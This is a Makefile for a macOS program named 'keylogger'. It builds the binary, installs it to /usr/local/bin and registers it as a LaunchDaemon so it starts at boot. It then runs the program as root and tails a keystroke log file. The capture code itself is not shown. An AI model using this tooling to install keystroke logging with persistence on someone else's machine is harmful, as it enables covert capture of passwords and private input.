# .PHONY: run
CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup: install
	cp $(PLIST) /Library/LaunchDaemons

clean:
	rm $(EXECUTABLE)

run: all
	sudo ./$(EXECUTABLE) &
	sudo tail -f /var/log/keystroke.log
